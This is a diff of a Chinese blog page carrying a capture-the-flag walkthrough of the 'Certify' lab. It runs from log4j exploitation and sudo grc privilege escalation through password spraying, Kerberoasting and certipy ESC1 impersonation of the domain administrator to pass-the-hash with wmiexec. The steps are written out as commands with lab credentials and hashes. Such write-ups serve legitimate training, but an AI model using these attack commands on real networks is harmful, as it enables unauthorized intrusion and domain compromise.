@@ -8,12 +8,12 @@
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集fscan 扫描下端口  log4j  存在这个服务，很像之前vulhub上的log4j的页面，其配置里也有log4j。      成功反弹shell,但是上来之后发现啥都干不了提权试试。 grc 提权  sudo grc cat &#x2F;root&#x2F;flag&#x2F;flag01.txt   上传下代理和fsacn,先扫描下内网 内网渗透  题目的标签中有个SMB而在扫描记录中又有一个fileserve">
+    <meta name="description" content="信息收集 fscan 扫描下端口  log4j  存在这个服务，很像之前vulhub上的log4j的页面，其配置里也有log4j。   成功反弹shell,但是上来之后发现啥都干不了提权试试。 grc 提权  sudo grc cat &#x2F;root&#x2F;flag&#x2F;flag01.txt  上传下代理和fsacn,先扫描下内网 内网渗透  题目的标签中有个SMB而在扫描记录中又有一个fileserver，连">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Certify-春秋云镜">
 <meta property="og:url" content="https://oceanzbz.github.io/post/51364caa.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="信息收集fscan 扫描下端口  log4j  存在这个服务，很像之前vulhub上的log4j的页面，其配置里也有log4j。      成功反弹shell,但是上来之后发现啥都干不了提权试试。 grc 提权  sudo grc cat &#x2F;root&#x2F;flag&#x2F;flag01.txt   上传下代理和fsacn,先扫描下内网 内网渗透  题目的标签中有个SMB而在扫描记录中又有一个fileserve">
+<meta property="og:description" content="信息收集 fscan 扫描下端口  log4j  存在这个服务，很像之前vulhub上的log4j的页面，其配置里也有log4j。   成功反弹shell,但是上来之后发现啥都干不了提权试试。 grc 提权  sudo grc cat &#x2F;root&#x2F;flag&#x2F;flag01.txt  上传下代理和fsacn,先扫描下内网 内网渗透  题目的标签中有个SMB而在扫描记录中又有一个fileserver，连">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://oceanzbz.github.io/post/51364caa/IMAGE20250308174254782.png">
 <meta property="og:image" content="https://oceanzbz.github.io/post/51364caa/IMAGE20250308174329178.png">
@@ -204,81 +204,60 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>fscan 扫描下端口</p>
+    <h2 id="信息收集">信息收集</h2>
+<p>fscan 扫描下端口</p>
 <img src="/post/51364caa/IMAGE20250308174254782.png" class="">
-<h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><img src="/post/51364caa/IMAGE20250308174329178.png" class="">
-
+<h2 id="log4j">log4j</h2>
+<img src="/post/51364caa/IMAGE20250308174329178.png" class="">
 <p>存在这个服务，很像之前vulhub上的log4j的页面，其配置里也有log4j。</p>
 <img src="/post/51364caa/IMAGE20250308174824071.png" class="">
-
-
 <img src="/post/51364caa/IMAGE20250308174801876.png" class="">
-
 <p>成功反弹shell,但是上来之后发现啥都干不了提权试试。</p>
-<h2 id="grc-提权"><a href="#grc-提权" class="headerlink" title="grc 提权"></a>grc 提权</h2><img src="/post/51364caa/IMAGE20250308175001149.png" class="">
-
+<h2 id="grc-提权">grc 提权</h2>
+<img src="/post/51364caa/IMAGE20250308175001149.png" class="">
 <p><code>sudo grc cat /root/flag/flag01.txt</code></p>
 <img src="/post/51364caa/IMAGE20250308175046411.png" class="">
-
 <p>上传下代理和fsacn,先扫描下内网</p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><img src="/post/51364caa/IMAGE20250308175445252.png" class="">
-
+<h2 id="内网渗透">内网渗透</h2>
+<img src="/post/51364caa/IMAGE20250308175445252.png" class="">
 <p>题目的标签中有个SMB而在扫描记录中又有一个fileserver，连一下试试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbclient.py 172.22.9.47</span><br></pre></td></tr></table></figure>
-
 <img src="/post/51364caa/IMAGE20250308180108256.png" class="">
-
 <img src="/post/51364caa/IMAGE20250308180205865.png" class="">
-
 <p>接着把上级目录下的文件下载一下。然后导入一下这个db数据库查看一下</p>
 <img src="/post/51364caa/IMAGE20250308181048351.png" class="">
-
 <p>一堆用户名</p>
 <img src="/post/51364caa/IMAGE20250308181100318.png" class="">
-
 <p>还有几个密码，喷洒下试试,两种方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -L user.txt -P pass 172.22.9.26 rdp</span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.9.26 -u user -p pass -d xiaorang.lab</span><br></pre></td></tr></table></figure>
-
 <img src="/post/51364caa/IMAGE20250308182001253.png" class="">
-
 <p>想着rdp一下发现都连不上去，看到flag02里有个提示spn的东西。</p>
-<h3 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h3><p>使用impacket脚本跑一下</p>
+<h3 id="kerberoasting攻击">kerberoasting攻击</h3>
+<p>使用impacket脚本跑一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>
-
 <img src="/post/51364caa/IMAGE20250308182816056.png" class="">
-
 <p>爆破下这两个hash</p>
 <img src="/post/51364caa/IMAGE20250308182940440.png" class="">
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangxia:MyPass2@@6</span><br><span class="line">chenchen:@Passw0rd@</span><br></pre></td></tr></table></figure>
-
 <p>然后再试试rdp看看行不行</p>
 <img src="/post/51364caa/IMAGE20250308183813541.png" class="">
-
 <p>但是没有权限。</p>
-<h3 id="adcs"><a href="#adcs" class="headerlink" title="adcs"></a>adcs</h3><p>先枚举下有啥漏洞</p>
+<h3 id="adcs">adcs</h3>
+<p>先枚举下有啥漏洞</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad find -u &#x27;liupeng@xiaorang.lab&#x27; -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Name                            : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00</span><br><span class="line">    Certificate Validity End            : 2028-07-14 04:43:21+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Unknown</span><br><span class="line">    Request Disposition                 : Unknown</span><br><span class="line">    Enforce Encryption for Requests     : Unknown</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : XR Manager</span><br><span class="line">    Display Name                        : XR Manager</span><br><span class="line">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Authenticated Users</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : XIAORANG.LAB\Administrator</span><br><span class="line">        Write Owner Principals          : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Dacl Principals           : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Property Principals       : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;XIAORANG.LAB\\Domain Users&#x27; and &#x27;XIAORANG.LAB\\Authenticated Users&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>存在ESC1。先跟着别的师傅的思路打因为我不会。</p>
 <p>先改一下hosts，要不然会超时。</p>
-<h3 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h3><p>首先申请 XR Manager 证书模版并伪造域管理员，得到administrator.pfx</p>
+<h3 id="ESC1">ESC1</h3>
+<p>首先申请 XR Manager 证书模版并伪造域管理员，得到administrator.pfx</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27; -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure>
-
 <img src="/post/51364caa/IMAGE20250308184557804.png" class="">
-
 <p>然后利用administrator.pfx证书获取 TGT 和 NTLM Hash</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure>
-
 <img src="/post/51364caa/IMAGE20250308184656523.png" class="">
-
 <p>拿到域管的hash直接pth就行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk</span><br></pre></td></tr></table></figure>
-
 <img src="/post/51364caa/IMAGE20250308184841220.png" class="">
-
 <p>继续横道另一个机器上读取flag3</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.26 -codec gbk</span><br></pre></td></tr></table></figure>
 <img src="/post/51364caa/IMAGE20250308185215477.png" class="">
